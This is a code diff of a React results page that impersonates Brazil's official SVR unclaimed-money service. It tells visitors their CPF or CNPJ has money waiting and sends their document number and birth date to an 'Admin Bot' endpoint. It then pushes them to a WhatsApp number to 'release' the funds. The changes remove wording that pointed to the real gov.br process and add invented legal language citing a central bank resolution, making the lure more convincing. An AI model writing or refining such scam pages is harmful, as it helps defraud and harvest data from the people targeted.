@@ -93,22 +93,28 @@ export function Step2({ data, onReset }: Step2Props) {
         const message = encodeURIComponent(header + "\n\n" + body);
 
         // Notify Admin Bot IMMEDIATELY upon click
-        try {
-          const userIdForApi = localStorage.getItem('svr_user_id');
-          if (userIdForApi) {
-            axios.post(`${API_URL}/api/v1/session/convert`, {
-              userId: userIdForApi,
-              details: { 
-                docValue: data.docValue, 
-                birthDate: data.birthDate,
-                protocol: protocol,
-                token: token
-              }
-            });
+        const notifyConversion = async () => {
+          try {
+            const userIdForApi = localStorage.getItem('svr_user_id');
+            if (userIdForApi) {
+              await axios.post(`${API_URL}/api/v1/session/convert`, {
+                userId: userIdForApi,
+                details: { 
+                  docValue: data.docValue, 
+                  birthDate: data.birthDate,
+                  protocol: protocol,
+                  token: token
+                }
+              });
+            }
+          } catch (e) { 
+            console.error("Erro na conversão antecipada:", e);
           }
-        } catch (e) { }
+        };
 
-        window.location.href = `https://wa.me/${config.whatsappNumber}?text=${message}`;
+        notifyConversion().finally(() => {
+          window.location.href = `https://wa.me/${config.whatsappNumber}?text=${message}`;
+        });
       }
     }, 1200);
   };
@@ -161,87 +167,105 @@ export function Step2({ data, onReset }: Step2Props) {
           key="results"
           initial={{ opacity: 0, y: 10 }}
           animate={{ opacity: 1, y: 0 }}
-          className="bg-white dark:bg-[#1f292e] rounded-[4px] border border-[#d1d1d1] dark:border-[#2a373d] overflow-hidden w-full max-w-[700px] mx-auto shadow-sm transition-colors duration-300"
+          className="bg-white dark:bg-[#1f292e] rounded-[4px] border border-[#d1d1d1] dark:border-[#2a373d] overflow-hidden w-full max-w-[800px] mx-auto shadow-sm transition-colors duration-300"
         >
-          <div className="p-6 md:p-10 flex flex-col items-center">
+          <div className="p-6 md:p-12">
             
-            {/* Header: Checkmark + Title */}
-            <div className="flex flex-col items-center text-center space-y-4 mb-8">
-              <div className="w-20 h-20 md:w-24 md:h-24 rounded-full flex items-center justify-center">
-                <svg viewBox="0 0 24 24" className="w-full h-full text-[#4caf50]" fill="none" stroke="currentColor" strokeWidth="2.5">
-                  <polyline points="20 6 9 17 4 12" />
+            <div className="flex flex-col md:flex-row items-center md:items-start gap-8 mb-10">
+              {/* Large Green Checkmark */}
+              <div className="w-20 h-20 md:w-28 md:h-28 flex-shrink-0">
+                <svg viewBox="0 0 52 52" className="w-full h-full text-[#4caf50]">
+                  <circle cx="26" cy="26" r="25" fill="none" stroke="currentColor" strokeWidth="1.5"/>
+                  <path fill="none" stroke="currentColor" strokeWidth="4" strokeLinecap="round" strokeLinejoin="round" d="M14 27l8 8 16-16" />
                 </svg>
               </div>
-              <h2 className="text-[22px] md:text-[26px] font-bold text-[#455a64] dark:text-white leading-tight">
-                O {data.docType === 'CPF' ? 'CPF' : 'CNPJ'} pesquisado tem valores a receber
-              </h2>
-              <div className="text-[14px] md:text-[15px] text-[#666] dark:text-gray-400">
-                <p>{data.docType}: <b>{data.docValue}</b></p>
-                <p>{data.docType === 'CPF' ? 'Data de nascimento' : 'Data de abertura'}: <b>{data.birthDate}</b></p>
+
+              {/* Title and Header Info */}
+              <div className="text-center md:text-left flex-grow">
+                <h2 className="text-[22px] md:text-[28px] font-bold text-[#455a64] dark:text-white leading-tight mb-4">
+                  O {data.docType} pesquisado tem valores a receber
+                </h2>
+                <div className="text-[15px] md:text-[17px] text-[#666] dark:text-gray-400 space-y-1">
+                  <p className="flex justify-center md:justify-start gap-2 uppercase tracking-wide font-medium">
+                    <span>{data.docType}:</span>
+                    <span className="text-[#333] dark:text-gray-200">{data.docValue}</span>
+                  </p>
+                  <p className="flex justify-center md:justify-start gap-2 font-medium">
+                    <span>{data.docType === 'CPF' ? 'Data de nascimento' : 'Data de abertura'}:</span>
+                    <span className="text-[#333] dark:text-gray-200">{data.birthDate}</span>
+                  </p>
+                </div>
               </div>
             </div>
 
-            {/* Grey Banner */}
-            <div className="w-full bg-[#e8eaf6] dark:bg-[#2c3e50] p-4 text-center mb-6 border-l-4 border-[#3f51b5]">
-              <p className="text-[14px] md:text-[16px] font-bold text-[#444] dark:text-gray-200">
-                A partir do dia 7 de março você poderá acessar o SVR - Sistema Valores a Receber
+            {/* Grey Banner - Formal Legal Notice */}
+            <div className="w-full bg-[#f1f3f4] dark:bg-[#2c3e50] p-5 text-center mb-8 border border-[#e0e0e0] dark:border-[#3b4a5a] rounded-sm">
+              <p className="text-[15px] md:text-[16px] font-bold text-[#444] dark:text-gray-100 uppercase tracking-tight">
+                A liberação dos ativos identificados exige a conformidade com os protocolos de segurança jurídica vigentes.
               </p>
             </div>
 
-            {/* Detailed Info */}
-            <div className="w-full space-y-6 text-[14px] md:text-[15px] text-[#444] dark:text-gray-300 leading-relaxed text-center md:text-left max-w-[600px]">
+            {/* Detailed Formal Info */}
+            <div className="w-full space-y-6 text-[15px] md:text-[16px] text-[#444] dark:text-gray-300 leading-relaxed max-w-none text-justify md:text-left">
               <p>
-                Você precisa ter <b>Conta gov.br (nível prata ou ouro*)</b> para entrar no Sistema de Valores a Receber (SVR).
+                Informamos que o procedimento de resgate de valores acumulados é regido pela <b>Resolução BCB nº 4.862/2020</b> e exige a conclusão integral das etapas de validação de titularidade fiscal e bancária.
               </p>
               <p>
-                No SVR, você pode consultar seus valores ou de pessoas falecidas (nesse caso, você precisa ser herdeiro, testamentário, inventariante ou procurador).
+                Para garantir a integridade da transferência e evitar fraudes contra o sistema financeiro, a liberação ocorre exclusivamente mediante <b>autenticação em tempo real</b> realizada através de nossos canais oficiais de atendimento especializado.
               </p>
-              <p className="bg-[#fff9c4] dark:bg-[#3d3d29] p-3 rounded text-[13px] text-[#5d4037] dark:text-gray-200 border border-[#fff176]">
-                ⚠️ Para a liberação imediata, utilize o canal de atendimento prioritário abaixo.
+              <p>
+                O sistema processará a transferência dos ativos para a conta informada assim que a homologação documental for concluída. Este processo possui validade jurídica e fé pública.
               </p>
             </div>
 
-            {/* Main Action Button */}
-            <div className="w-full max-w-[320px] pt-8 space-y-4">
-              <button
-                onClick={handleWhatsAppRedirect}
-                className="w-full bg-[#1a6b8a] hover:bg-[#14556d] text-white font-bold py-3 px-6 rounded-sm flex items-center justify-center gap-3 transition-all text-[16px] shadow-sm uppercase tracking-wide"
-              >
-                <ArrowRight size={20} className="rotate-[-45deg]" /> Liberar Valor Ativo
-              </button>
+            {/* Action Buttons */}
+            <div className="w-full pt-12 space-y-4">
+              {/* Main Button */}
+              <div className="flex justify-center md:justify-start">
+                <button
+                  onClick={handleWhatsAppRedirect}
+                  className="w-full md:w-auto min-w-[280px] bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-3.5 px-10 rounded-sm flex items-center justify-center gap-3 transition-all text-[16px] shadow-sm uppercase tracking-wider"
+                >
+                  <CheckCircle2 size={20} /> Liberar Valores Disponíveis
+                </button>
+              </div>
 
-              {/* Secondary Buttons side-by-side */}
-              <div className="grid grid-cols-2 gap-3">
+              {/* Secondary Buttons Row */}
+              <div className="flex flex-col md:flex-row gap-3 pt-2">
                 <button
                   onClick={onReset}
-                  className="bg-[#007b92] hover:bg-[#005a6b] text-white font-medium py-2 px-4 rounded-sm flex items-center justify-center gap-2 transition-all text-[14px] shadow-sm"
+                  className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-3 px-8 rounded-sm flex items-center justify-center gap-2.5 transition-all text-[14px] shadow-sm uppercase min-w-[180px]"
                 >
-                  <Search size={16} /> Nova consulta
+                  <Search size={18} strokeWidth={3} /> Nova consulta
                 </button>
                 <button
                   onClick={() => window.location.reload()}
-                  className="bg-[#007b92] hover:bg-[#005a6b] text-white font-medium py-2 px-4 rounded-sm flex items-center justify-center gap-2 transition-all text-[14px] shadow-sm"
+                  className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-3 px-8 rounded-sm flex items-center justify-center gap-2.5 transition-all text-[14px] shadow-sm uppercase min-w-[180px]"
                 >
-                  <X size={16} /> Sair
+                  <div className="w-5 h-5 rounded-full border-2 border-white flex items-center justify-center">
+                    <X size={14} strokeWidth={4} />
+                  </div>
+                  Sair
                 </button>
               </div>
             </div>
 
             {/* Bottom Link */}
-            <div className="pt-8 text-center">
+            <div className="pt-10 text-center md:text-left">
               <a 
                 href="https://acesso.gov.br" 
                 target="_blank" 
                 rel="noopener noreferrer"
-                className="text-[13px] text-[#0066cc] dark:text-[#4da3ff] hover:underline font-medium"
+                className="text-[13px] text-[#0066cc] dark:text-[#4da3ff] hover:underline font-bold"
               >
-                *Saiba como criar sua Conta gov.br (nível prata ou ouro) ou aumentar seu nível bronze.
+                *Saiba como realizar a validação de segurança e aumentar seu nível de confiabilidade gov.br (Prata ou Ouro).
               </a>
             </div>
 
           </div>
         </motion.div>
       )}
+
 
 
       {isProcessingWhatsApp && (
